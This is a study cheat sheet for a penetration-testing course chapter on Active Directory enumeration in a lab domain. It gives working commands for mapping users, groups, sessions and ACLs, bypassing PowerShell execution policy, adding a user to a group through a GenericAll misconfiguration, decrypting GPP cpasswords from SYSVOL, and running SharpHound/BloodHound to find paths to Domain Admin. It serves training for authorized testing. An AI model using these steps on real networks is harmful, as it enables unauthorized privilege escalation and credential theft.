# Active Directory Introduction and Enumeration Cheat Sheet (PEN-200, Ch. 22)

Learning Units: Introduction to Active Directory; AD enumeration using manual tools; AD enumeration using automated tools. Everything gathered here feeds directly into the later **Attacking AD Authentication** and **Lateral Movement in AD** modules.

---

## 22.1 Active Directory — Introduction

**Active Directory Domain Services (AD/AD DS)** — lets sysadmins centrally manage OSes, applications, users, and data access at scale. Installed with a standard config, but usually customized per-org.

Core object model:
| Term | Meaning |
|---|---|
| **Domain** | A named AD instance (e.g. `corp.com`), usually named after the org |
| **Object** | Anything stored in AD: computers, users, groups, etc. Each has **attributes** that vary by object type (e.g. a user object has first name, last name, username, phone number) |
| **OU (Organizational Unit)** | Container used to organize objects — comparable to filesystem folders |
| **Computer object** | Represents a domain-joined server/workstation |
| **User object** | Represents an account that can log on to domain-joined computers |
| **Domain Controller (DC)** | Central hub of the domain — validates logons, stores all OUs/objects/attributes. One or more per domain |
| **AD Group** | Objects bundled so admins can manage them (and their permissions) as a unit |
| **Domain Admins** | The most privileged group in the domain — a member is a **domain administrator**; compromising one = complete domain control |

> An AD environment has a critical dependency on **DNS**. A typical domain controller also hosts a DNS server authoritative for its domain.

### 22.1.1 Enumeration — defining our goals

Scenario used throughout the module (assumed-breach style, common in real engagements to save time / show org impact of an already-compromised account):
- Domain: `corp.com`
- Compromised user: **stephanie** — has RDP rights to a domain-joined Windows 11 client (**CLIENT75**), but is **not** a local admin on it.
- Goal: enumerate the full domain, escalate to the highest privilege possible (Domain Admin in the labs).

Key mindset points:
- **Perspective shift / pivot**: every time you gain a new user or computer context, re-run enumeration from that vantage point — permissions vary per-object even for seemingly-identical users.
- "Rinse and repeat" enumeration is *the* key skill, especially in large orgs — never assume a new low-priv account gives nothing new.

---

## 22.2 Active Directory — Manual Enumeration

Connect to the compromised user's Windows client via RDP:

```bash
kali@kali:~$ xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
```

> **Warning:** Prefer RDP over PowerShell Remoting/WinRM for AD enumeration. WinRM sessions suffer from the **Kerberos Double Hop** issue, which can break your ability to run domain enumeration tools from that session. RDP avoids it. (Kerberos Double-Hop is covered in depth in PEN-300.)

### 22.2.1 Enumerating Active Directory using `net.exe`

`net.exe` is installed by default on all Windows hosts — no extra tooling needed.

```cmd
:: List all domain users
net user /domain

:: Query a specific user's details (password age, group membership, etc.)
net user jeffadmin /domain

:: List all domain groups
net group /domain

:: List members of a specific (often custom) group
net group "Sales Department" /domain
```

Findings from the walkthrough: `jeffadmin` is a member of **Domain Admins** (found via `net user jeffadmin /domain` → `Global Group memberships`); `pete` and `stephanie` are members of the custom **Sales Department** group.

`net.exe` limitations you'll hit later: it only enumerates **global** groups (misses Domain Local groups), can't unravel **nested group** membership reliably, and can't display arbitrary object attributes.

### 22.2.2 Enumerating Active Directory using PowerShell and .NET classes

`Get-ADUser` / RSAT cmdlets require **Remote Server Administration Tools**, which are installed by default only on DCs, rarely on clients, and require admin rights to install — so build a lower-privilege alternative using raw **LDAP** via **ADSI** (Active Directory Services Interface — a set of COM-based interfaces acting as an LDAP provider).

> LDAP is not exclusive to AD — other directory services use it too.

**LDAP path format:**
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
- **HostName** — computer name, IP, or domain name. Best practice: target the **PDC (Primary Domain Controller)** — the DC holding the `PdcRoleOwner` property — for the most up-to-date data (there's only one PDC per domain).
- **PortNumber** — optional; auto-selected based on SSL usage. Only needed for non-default ports.
- **DistinguishedName (DN)** — uniquely identifies an object in AD. Read right-to-left: `CN=stephanie,CN=Users,DC=corp,DC=com` → `DC=corp,DC=com` (domain component, top of the LDAP tree) → `CN=Users` (parent container) → `CN=stephanie` (the object itself, lowest in the hierarchy).

Find the PDC hostname with the `System.DirectoryServices.ActiveDirectory.Domain` .NET class:

```powershell
PS C:\Users\stephanie> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
# Returns Forest, DomainControllers, DomainMode, PdcRoleOwner, RidRoleOwner,
# InfrastructureRoleOwner, Name, etc. -- PdcRoleOwner is what we need (e.g. DC1.corp.com)
```

Bypass the execution policy to run a saved script:
```powershell
PS C:\Users\stephanie> powershell -ep bypass
```

Build the full LDAP path dynamically:
```powershell
# Store domain object, then extract PDC name
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name

# Get the domain's Distinguished Name via ADSI (empty '' = top of the AD hierarchy)
$DN = ([adsi]'').distinguishedName

# Assemble full LDAP path
$LDAP = "LDAP://$PDC/$DN"
$LDAP
# -> LDAP://DC1.corp.com/DC=corp,DC=com
```

### 22.2.3 Adding search functionality to our script

Two more `System.DirectoryServices` .NET classes:
- **`DirectoryEntry`** — encapsulates an AD object (can optionally take credentials to auth to the domain).
- **`DirectorySearcher`** — runs LDAP queries; needs a `SearchRoot` (here, the `DirectoryEntry` pointing at the top of the hierarchy). `.FindAll()` returns every matching entry.

```powershell
$direntry    = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()          # unfiltered = returns EVERY object in the domain
```

**Filtering with `samAccountType`** — an attribute present on all user, computer, and group objects:

| samAccountType value (decimal) | Meaning |
|---|---|
| `805306368` (hex `0x30000000`) | Normal user account |

```powershell
$dirsearcher.filter = "samAccountType=805306368"
$dirsearcher.FindAll()          # all user objects in the domain
```

Print every attribute of the matched objects with nested loops:
```powershell
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}
```
Interesting attributes seen on a user object: `logoncount`, `objectcategory`, `dscorepropagationdata`, `usnchanged`, `name`, `badpasswordtime`, `pwdlastset`, `objectclass`, `badpwdcount`, `samaccounttype`, `lastlogontimestamp`, `objectguid`, `memberof`, `distinguishedname`, `admincount`, `samaccountname`, `objectsid`, `lastlogoff`, `accountexpires`.

Filter by a specific object and only show group membership:
```powershell
$dirsearcher.filter = "name=jeffadmin"
$result = $dirsearcher.FindAll()
Foreach($obj in $result) {
    Foreach($prop in $obj.Properties) { $prop.memberof }
    Write-Host "-------------------------------"
}
# -> CN=Domain Admins,CN=Users,DC=corp,DC=com
# -> CN=Administrators,CN=Builtin,DC=corp,DC=com
```

**Wrap it in a reusable function:**
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```
```powershell
Import-Module .\function.ps1

# Re-run user enumeration through the function
LDAPSearch -LDAPQuery "(samAccountType=805306368)"

# List every group object (objectClass=group finds Domain Local groups too, unlike net.exe)
LDAPSearch -LDAPQuery "(objectclass=group)"

# Expand every group's `member` attribute in one pass
foreach($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
    $group.properties | Select "cn","member"
}

# Target one specific group and read its member attribute directly
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
```

**Nested groups discovered this way** (missed entirely by `net.exe`, which only lists user objects, not groups, and can't show extended attributes):
```
Sales Department       -> Development Department (nested group), pete, stephanie
Development Department -> Management Department (nested group), pete, dave
Management Department  -> jen
```
So `jen` is only a *direct* member of Management Department, but an *indirect* member of Development Department and Sales Department via inherited nesting — this kind of unintentional privilege inheritance is a common misconfiguration attackers abuse.

### 22.2.4 AD enumeration with PowerView

PowerView wraps the same .NET/LDAP techniques into ready-made cmdlets. Pre-staged in `C:\Tools` on CLIENT75.

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1

Get-NetDomain                                   # same info as GetCurrentDomain()
Get-NetUser                                     # full attribute dump for every user
Get-NetUser | select cn                         # clean username list
Get-NetUser | select cn,pwdlastset,lastlogon    # spot dormant accounts / stale passwords

Get-NetGroup | select cn                        # list groups
Get-NetGroup "Sales Department" | select member # members of a specific group (including nested)
```

> Dormant accounts (no recent logon/password change) are attractive takeover targets — less likely to draw attention, and may predate a password-policy tightening (weaker password).

---

## 22.3 Manual Enumeration — Expanding Our Repertoire

Goal: build a mental/visual **map of the domain** (objects + relationships) to spot attack paths — you don't need to literally draw it, but understanding the relationships matters more than any single object.

### 22.3.1 Enumerating operating systems

```powershell
PS C:\Tools> Get-NetComputer
PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname
PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```
Example findings: 3 servers (all Windows Server 2022 Standard, incl. the DC) + 3 clients (two Windows 11 Pro, one **Windows 10 Pro** — the oldest/likely-weakest OS in the domain, worth prioritizing). Grab OS/hostname info early to spot outdated, high-value targets (old OS, web server, file server, etc.) without a broad port scan.

### 22.3.2 Getting an overview — permissions and logged-on users

Maintaining access beyond a single account matters: if you can compromise other users with equivalent access, you survive a password reset or account lockout on the original foothold. Escalation doesn't have to target Domain Admins directly — **service accounts** and other non-DA principals can hold outsized privileges (e.g., local admin on specific servers) and may guard the real "crown jewels" (databases, file servers) without needing DA at all.

> When an attacker chains together access via multiple accounts to reach a goal, it's called a **chained compromise**.

**Find local admin rights across the domain:**
```powershell
PS C:\Tools> Find-LocalAdminAccess
```
Uses `OpenServiceW` to try to open the target's **Service Control Manager (SCM)** database with `SC_MANAGER_ALL_ACCESS`; success implies local admin rights. Example: revealed `stephanie` has admin rights on `client74.corp.com`. Can take a few minutes on larger environments.

**Find logged-on sessions:**
```powershell
PS C:\Tools> Get-NetSession -ComputerName files04
PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
# VERBOSE: [Get-NetSession] Error: Access is denied
```
`Get-NetSession` wraps the classic `NetWkstaUserEnum` (needs admin) and `NetSessionEnum` (historically didn't) Windows APIs.

`NetSessionEnum` query levels:
| Level | Returns |
|---|---|
| 0 | Only the computer name establishing the session |
| 1, 2 | More detail, but **require administrative privileges** |
| 10 | Computer + user name (PowerView's default level) |
| 502 | Computer + user name, most detail |

Permissions to enumerate remote sessions are governed by the **`SrvsvcSessionInfo`** registry key under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity`. Check its ACL:
```powershell
PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```
Modern Windows locks this key down to `BUILTIN`, `NT AUTHORITY`, `CREATOR OWNER`, and an application **capability SID** (an unforgeable token granting a Windows component/UWP app resource access) — none of which permit remote `NetSessionEnum` reads. Older Windows allowed `Authenticated Users` here; least-privilege hardening removed it, so on default Windows 11 `NetSessionEnum` reliably fails remotely with "Access is denied."

**Alternative: PsLoggedOn** (SysInternals Suite, at `C:\Tools\PSTools` on CLIENT75) — reads `HKEY_USERS` to map SIDs → usernames for local logons, and also calls `NetSessionEnum` for resource-share logons.
```powershell
PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04
PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04
PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74
```
Findings: `jeff` logged on locally at FILES04; nobody logged on locally at WEB04; `jeffadmin` logged on locally at CLIENT74, with `stephanie` shown as a resource-share logon there too.

> PsLoggedOn depends on the **Remote Registry** service. Disabled by default on Windows workstations since Windows 8 (though admins may re-enable it for management tooling), but **enabled by default** on Windows Server 2012 R2, 2016 (1607), 2019 (1809), and 2022 (21H2). If enabled, it auto-stops after 10 minutes idle but re-triggers on connection.

Finding on CLIENT74 (`jeffadmin` session + `stephanie` local admin rights there) = a strong attack path toward Domain Admin — but discipline says: keep enumerating rather than immediately chasing the quick win.

### 22.3.3 Enumeration through service principal names

**Service accounts** run applications under AD identity with the least privilege they need (vs. built-in `LOCAL SYSTEM`/`Network Service`, which is often over-privileged). Complex apps (Exchange, MS SQL, IIS) register a **Service Principal Name (SPN)** — a unique service instance identifier — tying the service to a specific AD account.

| Account type | Introduced | Notes |
|---|---|---|
| Basic Service Account | — | Manually managed domain user acting as a service identity |
| Managed Service Account (MSA) | Windows Server 2008 R2 | Tighter AD integration; no redundancy support (bad fit for clustered MS SQL/Exchange) |
| Group Managed Service Account (gMSA) | Windows Server 2012 | Supports redundancy; requires DCs running Server 2012+ |

Enumerating SPNs reveals hostnames/ports of AD-integrated applications **without a broad port scan**, since SPN data lives on the DC.

```cmd
:: setspn.exe -- built into Windows; -L lists SPNs for a given account
c:\Tools> setspn -L iis_service
:: Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
::   HTTP/web04.corp.com
::   HTTP/web04
::   HTTP/web04.corp.com:80
```

PowerView alternative — enumerate every account with a registered SPN in one shot:
```powershell
PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

Follow up on discovered service hostnames:
```powershell
PS C:\Tools\> nslookup.exe web04.corp.com
```
The `iis_service` SPN (`HTTP/web04.corp.com`) resolves to an internal web app requiring a login — noted as a target of interest. Service accounts often carry more privilege than a regular domain user, making a linked SPN valuable to chase.

### 22.3.4 Active Directory object permissions

Every AD object can carry an **Access Control List (ACL)** made of individual **Access Control Entries (ACE)**, each allowing or denying a specific right. When a user accesses an object, their access token (identity + permissions) is validated against the object's ACL.

Key permission types relevant to attackers:
| Permission | Grants |
|---|---|
| `GenericAll` | Full permissions on the object |
| `GenericWrite` | Edit certain attributes on the object |
| `WriteOwner` | Change ownership of the object |
| `WriteDACL` | Edit the ACEs applied to the object |
| `AllExtendedRights` | Change/reset password, etc. |
| `ForceChangePassword` | Change the object's password |
| `Self` (Self-Membership) | Add yourself to an object (e.g. a group) |

**Enumerate ACEs with PowerView's `Get-ObjectAcl`:**
```powershell
PS C:\Tools> Get-ObjectAcl -Identity stephanie
```
Key output fields: `ObjectSID` (the target object), `ActiveDirectoryRights` (the right granted), `SecurityIdentifier` (who holds that right). Resolve SIDs to readable names:
```powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
# -> CORP\stephanie
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
# -> CORP\RAS and IAS Servers
```

**Hunt for `GenericAll` on a specific object** (e.g. a group we're already interested in):
```powershell
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
# -> CORP\Domain Admins
# -> CORP\stephanie          <-- unexpected: regular user with GenericAll = likely misconfiguration
# -> BUILTIN\Account Operators
# -> Local System
# -> CORP\Enterprise Admins
```
Finding a regular domain user (`stephanie`) with `GenericAll` on a group object is a red flag — likely a misconfiguration and a real privilege-escalation path.

**Abuse it (proof of concept — add/remove self from the group via `net.exe`):**
```cmd
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain   :: clean up afterward
```
Verify with `Get-NetGroup "Management Department" | select member` before/after. Always clean up test changes made during an engagement.

### 22.3.5 Enumerating domain shares

PowerView can sweep every SMB share visible across the domain (share-finder style function; heavy on network chatter and can take a while to complete on larger domains) — output includes standard admin shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) plus custom shares (`backup`, `docshare`, `Tools`, `Users`, `sharing`, etc.) across the DC, servers, and clients.

**SYSVOL** — hosted on every DC at `%SystemRoot%\SYSVOL\Sysvol\domain-name`, readable by every domain user by default, and used for domain policies/scripts — always worth checking:
```powershell
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\
PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```
Old/abandoned Group Policy Preferences (GPP) XML files are a classic leftover artifact — they can contain an encrypted `cpassword` attribute for a local account (e.g. built-in Administrator):
```xml
<Properties action="U" newName="" fullName="admin" description="Change local admin"
            cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
            userName="Administrator (built-in)" .../>
```

> GPP historically let admins push local-workstation passwords via Group Policy, encrypted with AES-256 — but Microsoft published the private AES key, so any `cpassword` found in SYSVOL is trivially decryptable.

```bash
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

Check other non-default shares too:
```powershell
PS C:\Tools> ls \\FILES04\docshare
PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share
PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
```
Found: an onboarding email thread accidentally left on a share, containing a cleartext auto-generated password (`HenchmanPutridBonbon11`) for user `jeff`. Even if later rotated, combined with the GPP-decrypted password this builds a picture of the org's **password policy/pattern** — useful for building targeted wordlists for password spraying/brute force.

---

## 22.4 Active Directory — Automated Enumeration

Manual enumeration (22.2–22.3) is thorough but slow and produces output that's hard to organize by hand. Automated tools speed this up and surface attack paths that are easy to miss manually, especially at scale. **PingCastle** is one alternative (produces polished reports, but commercial licensing for most real use); this module focuses on the free, de facto standard: **BloodHound** (data collected by its companion collector, **SharpHound**).

> Automated collectors generate a lot of network traffic — expect admins to notice a traffic spike when these tools run.

> Even though the same information could theoretically be gathered manually, BloodHound's graphical relationship view often reveals attack paths that go unnoticed in raw text output.

### Collecting data with SharpHound

SharpHound ships as a compiled EXE, a source you can build yourself, or (used here) a **PowerShell script**. Grab the latest release rather than relying on a possibly-stale copy pre-staged on a target, then transfer `Sharphound.ps1` to the target and import it:

```powershell
PS C:\Users\stephanie\Downloads> powershell -ep bypass
PS C:\Users\stephanie\Downloads> Import-Module .\Sharphound.ps1
```

The actual collector is invoked via `Invoke-BloodHound` (not "Invoke-SharpHound" — non-obvious the first time):
```powershell
PS C:\Users\stephanie\Downloads> Get-Help Invoke-BloodHound
```
Notable parameters seen in the help output: `-CollectionMethod`, `-Domain`, `-OutputDirectory`, `-OutputPrefix`, `-ZipFilename`, `-NoZip`, `-Loop` / `-LoopDuration` / `-LoopInterval`, `-Verbosity`, `-Help`, `-Version`.

`-CollectionMethod All` runs **every** collection method except local group policy collection.

```powershell
PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
Output: JSON files, automatically zipped for easy transfer to Kali (`corp audit_<timestamp>_BloodHound.zip`), plus a `.bin` cache file (speeds up repeated runs — **not needed for analysis**, safe to delete).

> SharpHound's **Session** collection is one of the noisiest/slowest parts — it queries every reachable computer for logged-on sessions (the same `NetSessionEnum`/registry techniques used manually above), and can trigger detection or blue-team attention if run repeatedly/looped in a live environment.

### 22.4.2 Analysing data using BloodHound

BloodHound (installed via APT on Kali) stores its graph in **Neo4j**, an open-source **graph database** (nodes + edges + properties, not rows/columns) — this is what enables the visual relationship mapping.

```bash
kali@kali:~$ sudo neo4j start
# Started neo4j (pid:...). Available at http://localhost:7474
```
Browse to `http://localhost:7474`, log in with the default `neo4j` / `neo4j` credentials, then set a new password when prompted (you'll need it again to log in to BloodHound itself).

```bash
kali@kali:~$ bloodhound
```
Log in to the BloodHound GUI with the same `neo4j` username/password. BloodHound auto-detects the running Neo4j instance (green check).

**Upload collected data:** drag-and-drop the SharpHound zip onto the BloodHound window, or use the upload button (top right).

**DB Info tab** — quick sanity check on how much data was ingested (sessions, ACLs, users, groups counts, etc.); has a **Refresh** button for updating stats on large/changing datasets.

**Analysis tab** — pre-built queries, notably:
- **Find all Domain Admins** — lists DA group members as graph nodes (e.g. `jeffadmin` + built-in `Administrator`), with edges showing group membership.
- **Shortest Path to Domain Admins** — finds the shortest attack path from *any* starting node to DA. Example: revealed `stephanie` --`AdminTo`--> `CLIENT74`, and `jeffadmin` has a session on CLIENT74 and is a DA member — a clear path to escalate.
- **Shortest Paths to Domain Admins from Owned Principals** — same idea, scoped to objects you've explicitly marked as "owned." Returns "NO DATA RETURNED FROM QUERY" until you mark at least one owned object.

**Marking owned objects:** right-click a node → **Mark User as Owned** / **Mark Computer as Owned** (owned nodes get a skull icon). Mark every object you actually control (e.g. the `stephanie` user, and `CLIENT75` since you're logged in there, even without local admin on it).

> **Info:** Mark every object you have access to as owned to maximize visibility into potential attack vectors — a short path to your goal may hinge on ownership of one particular object.

Right-click an edge (e.g. the `AdminTo` line) → **Help** for detailed abuse info and OpSec considerations for that specific relationship/technique.

Example resulting attack path from the walkthrough:
```
CLIENT75 (stephanie has a session) --AdminTo--> CLIENT74 (jeffadmin has a session)
                                                        |
                                                  MemberOf
                                                        v
                                                 Domain Admins
```
i.e.: compromise/impersonate `jeffadmin` while logged in as `stephanie` (who has admin rights on CLIENT74, where jeffadmin is logged on) → land in Domain Admins.

> Node positions in BloodHound screenshots/figures are often manually rearranged for clarity — don't expect the live graph layout to match a diagram exactly.

BloodHound has far more functionality (custom Cypher queries, additional built-in analyses) beyond what's covered here — worth deeper exploration in the labs.

---

## Key Takeaways / Workflow Summary

1. **Land and orient**: RDP in with compromised creds (avoid WinRM — Kerberos Double Hop), start with `net user /domain` and `net group /domain` for a quick baseline.
2. **Go deeper manually**: build/borrow an LDAP-based enumeration path (PDC via `.NET` `Domain` class → DN via `[adsi]''` → `DirectoryEntry`/`DirectorySearcher`), or just use **PowerView** (`Get-NetDomain`, `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`) — it catches nested groups, Domain Local groups, and arbitrary attributes that `net.exe` misses.
3. **Map relationships, not just objects**: local admin rights (`Find-LocalAdminAccess`), logged-on sessions (`Get-NetSession`, `PsLoggedOn` — mind the `SrvsvcSessionInfo` ACL / Remote Registry dependency), SPNs (`setspn -L`, `Get-NetUser -SPN`), and object ACLs (`Get-ObjectAcl`, `Convert-SidToName`) — hunting for `GenericAll`/`GenericWrite`/`WriteDACL`/`ForceChangePassword` misconfigurations.
4. **Don't skip shares**: SYSVOL for old GPP `cpassword` blobs (`gpp-decrypt`), plus any custom shares for leftover credentials/documents.
5. **Automate for scale**: SharpHound (`Invoke-BloodHound -CollectionMethod All ...`) to collect, Neo4j + BloodHound GUI to analyze — use "Shortest Path to Domain Admins" and "...from Owned Principals" to find realistic attack chains, marking every object you actually control as **Owned** along the way.
6. **Enumeration is cyclic and perspective-dependent**: every new foothold (user or computer) warrants repeating steps 1–5 from that new vantage point.
